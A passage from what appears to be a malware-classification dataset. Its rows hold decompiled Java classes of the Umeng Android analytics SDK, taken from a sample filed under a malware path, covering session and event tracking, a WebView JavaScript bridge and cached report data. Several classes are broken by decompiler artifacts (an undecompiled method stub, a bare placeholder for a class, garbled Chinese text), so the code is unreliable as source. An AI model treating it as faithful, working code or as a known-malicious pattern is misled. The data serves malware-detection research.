onCloseWindow(  WebView webView){     this.a.onCloseWindow(webView);   }   @Override public boolean onCreateWindow(  WebView webView,  boolean z,  boolean z2,  Message message){     return this.a.onCreateWindow(webView,z,z2,message);   }   @Override public boolean onJsAlert(  WebView webView,  String str,  String str2,  JsResult jsResult){     return this.a.onJsAlert(webView,str,str2,jsResult);   }   @Override public boolean onJsBeforeUnload(  WebView webView,  String str,  String str2,  JsResult jsResult){     return this.a.onJsBeforeUnload(webView,str,str2,jsResult);   }   @Override public boolean onJsConfirm(  WebView webView,  String str,  String str2,  JsResult jsResult){     return this.a.onJsConfirm(webView,str,str2,jsResult);   }   @Override public void onProgressChanged(  WebView webView,  int i){     this.a.onProgressChanged(webView,i);   }   @Override public void onReceivedIcon(  WebView webView,  Bitmap bitmap){     this.a.onReceivedIcon(webView,bitmap);   }   @Override public void onReceivedTitle(  WebView webView,  String str){     this.a.onReceivedTitle(webView,str);   }   @Override public void onRequestFocus(  WebView webView){     this.a.onRequestFocus(webView);   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.umeng.analytics\b.code","public class b extends d {   private String m;   private String n;   public ExecutorService a=Executors.newSingleThreadExecutor();   private final int o=0;   private final int p=1;   String b="""";   String c="""";   private final String q=""start_millis"";   private final String r=""end_millis"";   private final String s=""last_fetch_location_time"";   private final long t=10000;   private final int u=com.umeng.common.util.g.c;   private final int v=com.umeng.common.util.g.b;   private final Stack<f> w=new Stack<>();   private final ArrayList<f> x=new ArrayList<>();   public void a(  String str){     try {       this.w.push(new f(str,System.currentTimeMillis()));     }  catch (    Exception e) {       e.printStackTrace();     }   }   public void b(  String str){     try {       if (!this.w.isEmpty() && this.w.peek().a.equals(str)) {         f pop=this.w.pop();         pop.b=System.currentTimeMillis() - pop.b;         this.x.add(pop);       }  else {         Log.e(g.q,""onPageEnd called without 'PageName' from corresponding onPageStart"");       }     }  catch (    Exception e) {       e.printStackTrace();     }   }   public void a(  String str,  String str2){     this.e.E=str;     this.e.F=str2;   }   public void a(  Context context){     try {       if (context == null) {         Log.b(g.q,""unexpected null context in onPause"");       }  else       if (!context.getClass().getName().equals(this.m)) {         Log.b(g.q,""onPause() called without context from corresponding onResume()"");       }  else {         this.a.execute(new a(context,0));       }     }  catch (    Exception e) {       Log.b(g.q,""Exception occurred in Mobclick.onRause(). "",e);     }   }   public void a(  Context context,  String str){     if (!TextUtils.isEmpty(str)) {       if (context == null) {         Log.b(g.q,""unexpected null context in reportError"");       }  else {         this.d.a(new com.umeng.analytics.a.d(str));         e(context);       }     }   }   public void a(  Context context,  Throwable th){     if (context != null && th != null) {       this.d.a(new com.umeng.analytics.a.d(th));       e(context);     }   } public final class a implements Runnable {     private final Object b=new Object();     private Context c;     private int d;     a(    Context context,    int i){       this.c=context.getApplicationContext();       this.d=i;     }     @Override public void run(){       try { synchronized (this.b) { switch (this.d) { case DownloadingService.g:             b.this.j(this.c);           break; case 1:         b.this.i(this.c);       break;   } } }  catch (Exception e) { Log.b(g.q,""Exception occurred in invokehander."",e); } } } private void h(Context context){ if (context == null) { Log.b(g.q,""unexpected null context in onResume""); }  else { this.m=context.getClass().getName(); } } public void b(Context context){ try { h(context); ExecutorService executorService=this.a; getClass(); executorService.execute(new a(context,1)); }  catch (Exception e) { Log.b(g.q,""Exception occurred in Mobclick.onResume(). "",e); } } public void c(Context context){ try { getClass(); a(context,2); }  catch (Exception e) { Log.b(g.q,""Exception occurred in Mobclick.flush(). "",e); } } public void a(Context context,String str,String str2,long j,int i){ if (context != null) { try { if (a(str,com.umeng.common.util.g.c) && i > 0) {   if (this.n == null) {     Log.e(g.q,""can't call onEvent before session is initialized"");   }  else   if (str2 != null && !a(str2,com.umeng.common.util.g.b)) {     Log.b(g.q,""invalid label in onEvent"");   }  else {     this.d.a(this.n,str,str2,j,i);     e(context);   } } }  catch (Exception e) { Log.b(g.q,""Exception occurred in Mobclick.onEvent(). "",e); return; } } Log.b(g.q,""invalid params in onEvent""); } public void a(Context context,String str,HashMap<String,String> hashMap,long j){ if (context != null) { try { if (!TextUtils.isEmpty(str)) {   if (a(hashMap)) {     if (this.n == null) {       Log.e(g.q,""can't call onEvent before session is initialized"");     }  else {       this.d.a(this.n,str,hashMap,j);       e(context);     }   } } }  catch (Exception e) { Log.b(g.q,""Exception occurred in Mobclick.onEvent(). "",e); return; } } Log.b(g.q,""invalid params in onKVEventEnd""); } public synchronized void i(Context context){ SharedPreferences e=j.e(context); if (e != null) { if (a(e)) { this.n=b(context,e); Log.a(g.q,""Start new session: "" + this.n); }  else { this.n=c(context,e); Log.a(g.q,""Extend current session: "" + this.n); } } } public synchronized void j(Context context){ SharedPreferences.Editor a2; SharedPreferences e=j.e(context); if (e != null) { long j=e.getLong(""start_millis"",-1L); if (j == -1) { Log.b(g.q,""onEndSession called before onStartSession""); }  else { long currentTimeMillis=System.currentTimeMillis(); if (g.j) {   a2=m.a(e,this.m,j,currentTimeMillis); }  else {   a2=m.a(e,this.x,j,currentTimeMillis);   this.x.clear(); } a2.putLong(""start_millis"",-1L); a2.putLong(""end_millis"",currentTimeMillis); a2.commit(); } a(context,e); a(context,5); } } private void a(Context context,SharedPreferences sharedPreferences){ SharedPreferences.Editor a2; long currentTimeMillis=System.currentTimeMillis(); if (g.i && currentTimeMillis - sharedPreferences.getLong(""last_fetch_location_time"",0L) >= 10000 && (a2=o.a(context,sharedPreferences)) != null) { a2.putLong(""last_fetch_location_time"",currentTimeMillis); a2.commit(); } } private boolean a(SharedPreferences sharedPreferences){ return System.currentTimeMillis() - sharedPreferences.getLong(""end_millis"",-1L) > g.d; } private String b(Context context,SharedPreferences sharedPreferences){ long currentTimeMillis=System.currentTimeMillis(); String a2=a(context,currentTimeMillis); com.umeng.analytics.a.h hVar=new com.umeng.analytics.a.h(context,a2); m a3=m.a(context); this.d.a(hVar); this.d.a(a3); SharedPreferences.Editor edit=sharedPreferences.edit(); edit.putString(l.f,a2); edit.putLong(""start_millis"",currentTimeMillis); edit.putLong(""end_millis"",-1L); edit.commit(); getClass(); a(context,4); return a2; } private String a(Context context,long j){ String q=this.l == null ? com.umeng.common.b.q(context) : this.l; StringBuilder sb=new StringBuilder(); sb.append(j).append(q).append(com.umeng.common.util.h.b(com.umeng.common.b.g(context))); return com.umeng.common.util.h.a(sb.toString()); } private String c(Context context,SharedPreferences sharedPreferences){ Long valueOf=Long.valueOf(System.currentTimeMillis()); SharedPreferences.Editor edit=sharedPreferences.edit(); edit.putLong(""start_millis"",valueOf.longValue()); edit.putLong(""end_millis"",-1L); edit.commit(); return sharedPreferences.getString(l.f,null); } private void d(Context context,String str){ try { if (g.m) { this.d.a(str); }  else { k a2=k.a(context,str); a2.a(Long.valueOf(System.currentTimeMillis())); a2.a(context); } }  catch (Exception e) { Log.a(g.q,""exception in save event begin info""); } } private int e(Context context,String str){ long longValue; int i=-1; try { if (g.m) { longValue=this.d.b(str); }  else { longValue=k.a(context,str).a().longValue(); } if (longValue <= 0) { return -1; } i=(int)(System.currentTimeMillis() - longValue); return i; }  catch (Exception e) { Log.a(g.q,""exception in get event duration"",e); return i; } } public void b(Context context,String str){ if (context == null || !a(str,com.umeng.common.util.g.c)) { Log.b(g.q,""invalid params in onEventBegin""); }  else { d(context,""_t"" + str); } } public void c(Context context,String str){ if (context == null || TextUtils.isEmpty(str)) { Log.a(g.q,""input Context is null or event_id is empty""); return; } int e=e(context,""_t"" + str); if (e < 0) { Log.b(g.q,""event duration less than 0 in onEventEnd""); }  else { a(context,str,null,e,1); } } public void a(Context context,String str,String str2){ if (context == null || !a(str,com.umeng.common.util.g.c) || !a(str2,com.umeng.common.util.g.b)) { Log.b(g.q,""invalid params in onEventBegin""); }  else { d(context,""_tl"" + str + str2); } } public void b(Context context,String str,String str2){ if (context == null || TextUtils.isEmpty(str2)) { Log.b(g.q,""invalid params in onEventEnd""); return; } int e=e(context,""_tl"" + str + str2); if (e < 0) { Log.b(g.q,""event duration less than 0 in onEvnetEnd""); }  else { a(context,str,str2,e,1); } } public void a(Context context,String str,HashMap<String,String> hashMap,String str2){ if (context == null || TextUtils.isEmpty(str) || TextUtils.isEmpty(str2)) { Log.b(g.q,""invalid params in onKVEventBegin""); return; } if (a(hashMap)) { try { String str3=str + str2; this.d.a(str3,hashMap); this.d.a(str3); }  catch (Exception e) { Log.e(g.q,""exception in save k-v event begin inof"",e); } } } public void c(Context context,String str,String str2){ if (context == null || TextUtils.isEmpty(str) || TextUtils.isEmpty(str2)) { Log.b(g.q,""invalid params in onKVEventEnd""); return; } String str3=str + str2; int e=e(context,str3); if (e < 0) { Log.b(g.q,""event duration less than 0 in onEvnetEnd""); }  else { a(context,str,this.d.c(str3),e); } } boolean a(String str,int i){ int length; return (str == null || (length=str.getBytes().length) == 0 || length > i) ? false : true; } boolean a(Map<String,String> map){ if (map == null || map.isEmpty()) { Log.b(g.q,""map is null or empty in onEvent""); return false; } for (Map.Entry<String,String> entry : map.entrySet()) { if (!a(entry.getKey(),com.umeng.common.util.g.c) || !a(entry.getValue(),com.umeng.common.util.g.b)) { Log.b(g.q,String.format(""invalid key-<%s> or value-<%s> "",entry.getKey(),entry.getValue())); return false; } } return true; } public void d(Context context){ try { if (!this.w.isEmpty()) { b(this.w.peek().a); } j(context); }  catch (Exception e) { e.printStackTrace(); } } @Override public void b(Context context,Throwable th){ try { this.d.a(new com.umeng.analytics.a.d(th)); if (!this.w.isEmpty()) { b(this.w.peek().a); } j(context); }  catch (Exception e) { Log.a(g.q,""Exception in onAppCrash"",e); } } } public final class b implements Runnable {   private Context b;   b(  Context context){     this.b=context.getApplicationContext();   }   @Override public void run(){     try { synchronized (d.this.b) {         d.this.d(this.b);       }     }  catch (    Error e) {       Log.b(g.q,""Error : "" + e.getMessage());       try {         j.j(this.b);       }  catch (      Exception e2) {         e2.printStackTrace();       }     } catch (    Exception e3) {       Log.b(g.q,""Exception occurred in ReportMessageHandler"",e3);     }   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.umeng.analytics\c.code","public class c {   private com.umeng.analytics.a.i a=new com.umeng.analytics.a.i();   private HashMap<String,k> b=new HashMap<>();   private HashMap<String,HashMap<String,String>> c=new HashMap<>();   private int d=10;   public void a(  int i){     this.d=i;   }   public int a(){     return this.a.b();   }   public boolean b(){     return this.a.b() > this.d;   }   public void a(  String str){     if (this.b.containsKey(str)) {       this.b.get(str).a(Long.valueOf(System.currentTimeMillis()));       return;     }     k kVar=new k(str);     kVar.a(Long.valueOf(System.currentTimeMillis()));     this.b.put(str,kVar);   }   public long b(  String str){     if (this.b.containsKey(str)) {       return this.b.get(str).a().longValue();     }     return -1L;   }   public void a(  String str,  HashMap<String,String> hashMap){     if (!this.c.containsKey(str)) {       this.c.put(str,hashMap);     }   }   public HashMap<String,String> c(  String str){     return (!this.b.containsKey(str) || this.b.get(str).b() <= 0) ? this.c.remove(str) : this.c.get(str);   }   public synchronized void a(  String str,  String str2,  String str3,  long j,  int i){     this.a.a(new com.umeng.analytics.a.e(str,str2,str3,i,j));   }   public synchronized void a(  String str,  String str2,  HashMap<String,String> hashMap,  long j){     this.a.a(str,new com.umeng.analytics.a.a(str2,hashMap,j));   }   public synchronized void a(  com.umeng.analytics.a.d dVar){     this.a.a(dVar);   }   public synchronized void a(  com.umeng.analytics.a.h hVar){     this.a.a(hVar);   }   public synchronized void a(  m mVar){     this.a.a(mVar);   }   public boolean c(){     return this.a.a();   }   public void a(  Context context){     if (a() > 0) {       String d=com.umeng.common.b.d(context);       JSONObject a=j.a(context,d);       com.umeng.analytics.a.i iVar=new com.umeng.analytics.a.i();       if (a != null) {         iVar.a(a);       } synchronized (this) {         iVar.a(this.a);         this.a.c();       }       j.a(context,iVar,d);     }   }   public void b(  Context context){     JSONObject a=j.a(context,com.umeng.common.b.d(context));     if (a != null && a.length() != 0) {       com.umeng.analytics.a.i iVar=new com.umeng.analytics.a.i();       iVar.a(a); synchronized (this) {         this.a.a(iVar);       }     }   }   public synchronized JSONObject d(){     JSONObject jSONObject;     try {       jSONObject=new JSONObject();       this.a.b(jSONObject);     }  catch (    Exception e) {       Log.d(g.q,"""",e);       jSONObject=null;     }     return jSONObject;   }   public synchronized void e(){     this.a.c();   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.umeng.analytics\d.code","!org.eclipse.jdt.core.dom.TypeDeclaration@769bb81"
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.umeng.analytics\e.code","class e extends JSONObject {   final d a;   public e(  d dVar) throws Exception {     this.a=dVar;     this.a.e.b(this);   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.umeng.analytics\f.code","public class f {   public String a;   public long b;   public f(  String str,  long j){     this.a=str;     this.b=j;   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.umeng.analytics\g.code","public class g {   public static final String A=""umeng_net_report_policy"";   public static final String B=""umeng_net_report_interval"";   public static final String C=""umeng_last_config_time"";   public static final String D=""umeng_local_report_policy"";   public static final String E=""umeng_local_report_interval"";   public static final String F=""last_report_time"";   public static final String G=""report_interval"";   public static final String H=""req_time"";   public static final String a=""Android"";   public static final String b=""Android"";   public static final String c=""4.6.3"";   static final int e=8;   static final int f=10;   static final String n=""last_send_time"";   static final String o=""cache_version"";   public static final String q=""MobclickAgent"";   static final String u=""age"";   static final String v=""gender"";   static final String w=""user_id"";   static final String x=""id_source"";   static final String y=""traffics_up"";   static final String z=""traffics_down"";   static long d=30000;   public static long g=86400000;   public static int h=10000;   public static boolean i=true;   public static boolean j=true;   static boolean k=true;   static boolean l=true;   static boolean m=true;   static final Object p=new Object();   static final String[] r={""http://alog.umeng.com/app_logs"",""http://alog.umeng.co/app_logs""};   public static final String[] s={""http://oc.umeng.com/check_config_update"",""http://oc.umeng.co/check_config_update""};   static boolean t=true; } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.umeng.analytics\h.code","class h {   private static final String a=h.class.getName();   h(){   }   public static java.lang.String a(  android.content.Context r5){     throw new UnsupportedOperationException(""Method not decompiled: com.umeng.analytics.h.a(android.content.Context):java.lang.String"");   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.umeng.analytics\i.code","interface i {   void b(  Context context,  Throwable th); } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.umeng.analytics\j.code","public final class j {   static long a=1209600000;   static long b=2097152;   private static final String c=""cache_version"";   private static final String d=""error"";   private static final String e=""mobclick_agent_user_"";   private static final String f=""mobclick_agent_online_setting_"";   private static final String g=""mobclick_agent_header_"";   private static final String h=""mobclick_agent_update_"";   private static final String i=""mobclick_agent_state_"";   private static final String j=""mobclick_agent_cached_"";   public static SharedPreferences a(  Context context){     return context.getSharedPreferences(e + context.getPackageName(),0);   }   public static SharedPreferences b(  Context context){     return context.getSharedPreferences(f + context.getPackageName(),0);   }   public static SharedPreferences c(  Context context){     return context.getSharedPreferences(g + context.getPackageName(),0);   }   static SharedPreferences d(  Context context){     return context.getSharedPreferences(h + context.getPackageName(),0);   }   public static SharedPreferences e(  Context context){     return context.getSharedPreferences(i + context.getPackageName(),0);   }   static String f(  Context context){     return g + context.getPackageName();   }   static String g(  Context context){     return j + context.getPackageName();   }   static JSONObject h(  Context context){     JSONObject jSONObject=new JSONObject();     SharedPreferences a2=a(context);     try {       if (a2.getInt(""gender"",-1) != -1) {         jSONObject.put(""sex"",a2.getInt(""gender"",-1));       }       if (a2.getInt(""age"",-1) != -1) {         jSONObject.put(""age"",a2.getInt(""age"",-1));       }       if (!"""".equals(a2.getString(""user_id"",""""))) {         jSONObject.put(""id"",a2.getString(""user_id"",""""));       }       if (!"""".equals(a2.getString(""id_source"",""""))) {         jSONObject.put(""url"",URLEncoder.encode(a2.getString(""id_source"",""""),""UTF-8""));       }     }  catch (    Exception e2) {       e2.printStackTrace();     }     if (jSONObject.length() > 0) {       return jSONObject;     }     return null;   }   public static int[] i(  Context context){     SharedPreferences b2=b(context);     int[] iArr=new int[2];     if (b2.getInt(g.A,-1) != -1) {       iArr[0]=b2.getInt(g.A,1);       iArr[1]=(int)b2.getLong(g.B,g.h);     }  else {       iArr[0]=b2.getInt(g.D,1);       iArr[1]=(int)b2.getLong(g.E,g.h);     }     return iArr;   }   static boolean a(  File file){     return file.exists() && file.length() > b;   }   public static JSONObject a(  Context context,  String str){     JSONObject jSONObject=null;     String g2=g(context);     try {       File file=new File(context.getFilesDir(),g2);       if (a(file)) {         file.delete();       }  else {         FileInputStream openFileInput=context.openFileInput(g2);         try {           try {             try {               JSONObject jSONObject2=new JSONObject(a(openFileInput));               if (!jSONObject2.optString(c).equals(str)) {                 jSONObject2.remove(d);               }               jSONObject2.remove(c);               int length=jSONObject2.length();               openFileInput=length;               if (length != 0) {                 jSONObject=jSONObject2;                 openFileInput=length;               }             }  catch (            JSONException e2) {               j(context);               e2.printStackTrace();               openFileInput=openFileInput;             }           }   finally {             openFileInput.close();           }         }  catch (        Exception e3) {           e3.printStackTrace();           openFileInput.close();           openFileInput=openFileInput;         }       }     }  catch (    FileNotFoundException e4) {     } catch (    IOException e5) {     } catch (    Throwable th) {     }     return jSONObject;   }   static String a(  InputStream inputStream) throws IOException {     InputStreamReader inputStreamReader=new InputStreamReader(inputStream);     char[] cArr=new char[1024];     StringWriter stringWriter=new StringWriter();     while (true) {       int read=inputStreamReader.read(cArr);       if (-1 != read) {         stringWriter.write(cArr,0,read);       }  else {         return stringWriter.toString();       }     }   }   static void a(  Context context,  JSONObject jSONObject,  String str) throws Exception {     if (jSONObject != null) {       String g2=g(context);       jSONObject.put(c,str);       FileOutputStream openFileOutput=context.openFileOutput(g2,0);       openFileOutput.write(jSONObject.toString().getBytes());       openFileOutput.flush();       openFileOutput.close();       Log.c(g.q,""cache buffer success"");     }   }   public static void a(  Context context,  com.umeng.analytics.a.g gVar,  String str){     if (gVar != null) {       try {         JSONObject jSONObject=new JSONObject();         gVar.b(jSONObject);         a(context,jSONObject,str);       }  catch (      Exception e2) {         Log.b(g.q,""cache message error"",e2);       }     }   }   public static void b(  Context context,  JSONObject jSONObject,  String str){     if (jSONObject != null) {       try {         a(context,jSONObject.optJSONObject(""body""),str);       }  catch (      Exception e2) {         Log.b(g.q,""cache message error"",e2);       }     }   }   public static void j(  Context context){     context.deleteFile(f(context));     context.deleteFile(g(context));   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.umeng.analytics\k.code","public class k {   private static final int b=4;   private Vector<Long> a;   private String c;   public k(  String str){     this.a=new Vector<>(4);     this.c=str;   }   public k(  String str,  int i){     this.c=str;     if (i < 0) {       this.a=new Vector<>(4);     }  else {       this.a=new Vector<>(i);     }   }   public void a(  Long l){     while (this.a.size() >= 4) {       this.a.remove(0);     }     this.a.add(l);   }   public Long a(){     int size=this.a.size();     if (size <= 0) {       return -1L;     }     return this.a.remove(size - 1);   }   public int b(){     return this.a.size();   }   public String toString(){     int size=this.a.size();     if (size <= 0) {       return null;     }     StringBuffer stringBuffer=new StringBuffer(4);     for (int i=0; i < size; i++) {       stringBuffer.append(this.a.get(i));       if (i != size - 1) {         stringBuffer.append("","");       }     }     this.a.clear();     return stringBuffer.toString();   }   public static k a(  Context context,  String str){     return a(str,j.e(context).getString(str,null));   }   public static k a(  String str,  String str2){     k kVar=new k(str);     if (!TextUtils.isEmpty(str2)) {       for (      String str3 : str2.split("","")) {         String trim=str3.trim();         if (!TextUtils.isEmpty(trim)) {           Long.valueOf(-1L);           try {             kVar.a(Long.valueOf(Long.parseLong(trim)));           }  catch (          Exception e) {           }         }       }     }     return kVar;   }   public void a(  Context context){     String kVar=toString();     SharedPreferences.Editor edit=j.e(context).edit();     if (TextUtils.isEmpty(kVar)) {       edit.remove(this.c).commit();     }  else {       edit.putString(this.c,kVar).commit();     }   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.umeng.analytics\MobclickAgent.code","public class MobclickAgent {   private static final b a=new b();   private static final com.umeng.analytics.onlineconfig.a b=new com.umeng.analytics.onlineconfig.a(); static {     b.a(a);   }   public static void setAutoLocation(  boolean z){     g.i=z;   }   public static void setWrapper(  String str,  String str2){     a.a(str,str2);   }   public static void setSessionContinueMillis(  long j){     g.d=j;   }   public static void setEnableEventBuffer(  boolean z){     g.m=z;   }   public static void setOnlineConfigureListener(  UmengOnlineConfigureListener umengOnlineConfigureListener){     b.a(umengOnlineConfigureListener);   }   public static b a(){     return a;   }   public static void setOpenGLContext(  GL10 gl10){     if (gl10 != null) {       String[] a2=com.umeng.common.b.a(gl10);       if (a2.length == 2) {         a.b=a2[0];         a.c=a2[1];       }     }   }   public static void openActivityDurationTrack(  boolean z){     g.j=z;   }   public static void onPageStart(  String str){     if (!TextUtils.isEmpty(str)) {       a.a(str);     }  else {       Log.b(g.q,""pageName is null or empty"");     }   }   public static void onPageEnd(  String str){     if (!TextUtils.isEmpty(str)) {       a.b(str);     }  else {       Log.b(g.q,""pageName is null or empty"");     }   }   public static void setDebugMode(  boolean z){     Log.LOG=z;   }   public static void setDefaultReportPolicy(  Context context,  int i){     Log.e(g.q,""æ­¤æ–¹æ³•ä¸�å†�ä½¿ç”¨ï¼Œè¯·ä½¿ç”¨åœ¨çº¿å�‚æ•°é…�ç½®ï¼Œå�‘é€�ç­–ç•¥"");   }   public static void onPause(  Context context){     a.a(context);   }   public static void onResume(  Context context){     if (context == null) {       Log.b(g.q,""unexpected null context in onResume"");     }  else {       a.b(context);     }   }   public static void onResume(  Context context,  String str,  String str2){     if (context == null) {       Log.b(g.q,""unexpected null context in onResume"");       return;     }     if (str == null || str.length() == 0) {       Log.b(g.q,""unexpected empty appkey in onResume"");       return;     }     a.l=str;     a.k=str2;     a.b(context);   }   public static void onError(  Context context){   }   public static void onError(  Context context,  String str){     if (str == null || str.length() == 0) {       Log.b(g.q,""unexpected empty appkey in onError"");     }  else {       a.l=str;       onError(context);     }   }   public static void reportError(  Context context,  String str){     a.a(context,str);   }   public static void reportError(  Context context,  Throwable th){     a.a(context,th);   }   public static void flush(  Context context){     a.c(context);   }   public static void onEvent(  Context context,  String str){     a.a(context,str,null,-1L,1);   }   public static void onEvent(  Context context,  String str,  int i){     a.a(context,str,null,-1L,i);   }   public static void onEvent(  Context context,  String str,  String str2,  int i){     if (TextUtils.isEmpty(str2)) {       Log.a(g.q,""label is null or empty"");     }  else {       a.a(context,str,str2,-1L,i);     }   }   public static void onEvent(  Context context,  String str,  String str2){     if (TextUtils.isEmpty(str2)) {       Log.a(g.q,""label is null or empty"");     }  else {       a.a(context,str,str2,-1L,1);     }   }   public static void onEvent(  Context context,  String str,  HashMap<String,String> hashMap){     a.a(context,str,hashMap,-1L);   }   public static void onEventDuration(  Context context,  String str,  long j){     if (j <= 0) {       Log.a(g.q,""duration is not valid in onEventDuration"");     }  else {       a.a(context,str,null,j,1);     }   }   public static void onEventDuration(  Context context,  String str,  String str2,  long j){     if (TextUtils.isEmpty(str2)) {       Log.a(g.q,""label is null or empty"");     }  else     if (j <= 0) {       Log.a(g.q,""duration is not valid in onEventDuration"");     }  else {       a.a(context,str,str2,j,1);     }   }   public static void onEventDuration(  Context context,  String str,  HashMap<String,String> hashMap,  long j){     if (j <= 0) {       Log.a(g.q,""duration is not valid in onEventDuration"");     }  else {       a.a(context,str,hashMap,j);     }   }   public static void onEventBegin(  Context context,  String str){     a.b(context,str);   }   public static void onEventEnd(  Context context,  String str){     a.c(context,str);   }   public static void onEventBegin(  Context context,  String str,  String str2){     a.a(context,str,str2);   }   public static void onEventEnd(  Context context,  String str,  String str2){     a.b(context,str,str2);   }   public static void onKVEventBegin(  Context context,  String str,  HashMap<String,String> hashMap,  String str2){     a.a(context,str,hashMap,str2);   }   public static void onKVEventEnd(  Context context,  String str,  String str2){     a.c(context,str,str2);   }   public static String getConfigParams(  Context context,  String str){     return j.b(context).getString(str,"""");   }   public static void updateOnlineConfig(  Context context,  String str,  String str2){     if (str == null || str.length() == 0) {       Log.b(g.q,""unexpected empty appkey in onResume"");     }  else {       b.a(context,str,str2);     }   }   public static void updateOnlineConfig(  Context context){     b.a(context);   }   public void setGender(  Context context,  Gender gender){     int i=0;     SharedPreferences a2=j.a(context); switch (gender) { case Male:       i=1;     break; case Female:   i=2; break; } a2.edit().putInt(""gender"",i).commit(); } public void setAge(Context context,int i){ SharedPreferences a2=j.a(context); if (i < 0 || i > 200) { Log.a(g.q,""not a valid age!""); }  else { a2.edit().putInt(""age"",i).commit(); } } public void setUserID(Context context,String str,String str2){ SharedPreferences a2=j.a(context); if (TextUtils.isEmpty(str)) { Log.a(g.q,""userID is null or empty""); return; } a2.edit().putString(""user_id"",str).commit(); if (TextUtils.isEmpty(str2)) { Log.a(g.q,""id source is null or empty""); }  else { a2.edit().putString(""id_source"",str2).commit(); } } public static void onKillProcess(Context context){ a.d(context); } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.umeng.analytics\MobclickAgentJSInterface.code","public class MobclickAgentJSInterface {   private Context a;   public MobclickAgentJSInterface(  Context context,  WebView webView){     this.a=context;     webView.getSettings().setJavaScriptEnabled(true);     webView.setWebChromeClient(new a(null));   }   public MobclickAgentJSInterface(  Context context,  WebView webView,  WebChromeClient webChromeClient){     this.a=context;     webView.getSettings().setJavaScriptEnabled(true);     webView.setWebChromeClient(new a(webChromeClient));   } final class a extends WebChromeClient {     WebChromeClient a;     private final String c=""ekv"";     private final String d=""event"";     public a(    WebChromeClient webChromeClient){       this.a=null;       if (webChromeClient == null) {         this.a=new WebChromeClient();       }  else {         this.a=webChromeClient;       }     }     @Override public boolean onJsPrompt(    WebView webView,    String str,    String str2,    String str3,    JsPromptResult jsPromptResult){       if (""ekv"".equals(str2)) {         try {           JSONObject jSONObject=new JSONObject(str3);           HashMap<String,String> hashMap=new HashMap<>();           String str4=(String)jSONObject.remove(""id"");           int intValue=jSONObject.isNull(""duration"") ? 0 : ((Integer)jSONObject.remove(""duration"")).intValue();           Iterator<String> keys=jSONObject.keys();           while (keys.hasNext()) {             String next=keys.next();             hashMap.put(next,jSONObject.getString(next));           }           MobclickAgent.a().a(MobclickAgentJSInterface.this.a,str4,hashMap,intValue);         }  catch (        Exception e) {           e.printStackTrace();         }       }  else       if (""event"".equals(str2)) {         try {           JSONObject jSONObject2=new JSONObject(str3);           String optString=jSONObject2.optString(""label"");           if ("""".equals(optString)) {             optString=null;           }           MobclickAgent.a().a(MobclickAgentJSInterface.this.a,jSONObject2.getString(""tag""),optString,jSONObject2.optInt(""duration""),1);         }  catch (        Exception e2) {         }       }  else {         return this.a.onJsPrompt(webView,str,str2,str3,jsPromptResult);       }       jsPromptResult.confirm();       return true;     }     @Override public void onCloseWindow(    WebView webView){       this.a.onCloseWindow(webView);     }     @Override public boolean onCreateWindow(    WebView webView,    boolean z,    boolean z2,    Message message){       return this.a.onCreateWindow(webView,z,z2,message);     }     @Override public boolean onJsAlert(    WebView webView,    String str,    String str2,    JsResult jsResult){       return this.a.onJsAlert(webView,str,str2,jsResult);     }     @Override public boolean onJsBeforeUnload(    WebView webView,    String str,    String str2,    JsResult jsResult){       return this.a.onJsBeforeUnload(webView,str,str2,jsResult);     }     @Override public boolean onJsConfirm(    WebView webView,    String str,    String str2,    JsResult jsResult){       return this.a.onJsConfirm(webView,str,str2,jsResult);     }     @Override public void onProgressChanged(    WebView webView,    int i){       this.a.onProgressChanged(webView,i);     }     @Override public void onReceivedIcon(    WebView webView,    Bitmap bitmap){       this.a.onReceivedIcon(webView,bitmap);     }     @Override public void onReceivedTitle(    WebView webView,    String str){       this.a.onReceivedTitle(webView,str);     }     @Override public void onRequestFocus(    WebView webView){       this.a.onRequestFocus(webView);     }   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.umeng.analytics\ReportPolicy.code","public class ReportPolicy {   public static final int BATCH_AT_LAUNCH=1;   public static final int BATCH_BY_INTERVAL=6;   public static final int DAILY=4;   static final int a=0;   static final int b=2;   static final int c=3;   static final int d=5; } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.umeng.analytics.a\a.code","public class a implements g {   public final HashMap<String,String> a;   public String b;   public long c;   public long d;   private final String e;   private final String f;   private final String g;   public a(){     this.c=0L;     this.d=0L;     this.e=""id"";     this.f=""ts"";     this.g=""du"";     this.a=new HashMap<>();   }   public a(  String str,  HashMap<String,String> hashMap,  long j){     this.c=0L;     this.d=0L;     this.e=""id"";     this.f=""ts"";     this.g=""du"";     this.b=str;     this.a=a(hashMap);     this.d=j;     this.c=b();   }   private HashMap<String,String> a(  HashMap<String,String> hashMap){     if (hashMap.size() > 10) {       int size=hashMap.size() - 10;       String[] strArr=new String[size];       int i=0;       for (      String str : hashMap.keySet()) {         if (i >= size) {           break;         }         strArr[i]=str;         i++;       }       for (      String str2 : strArr) {         hashMap.remove(str2);       }     }     return hashMap;   }   private long b(){     return 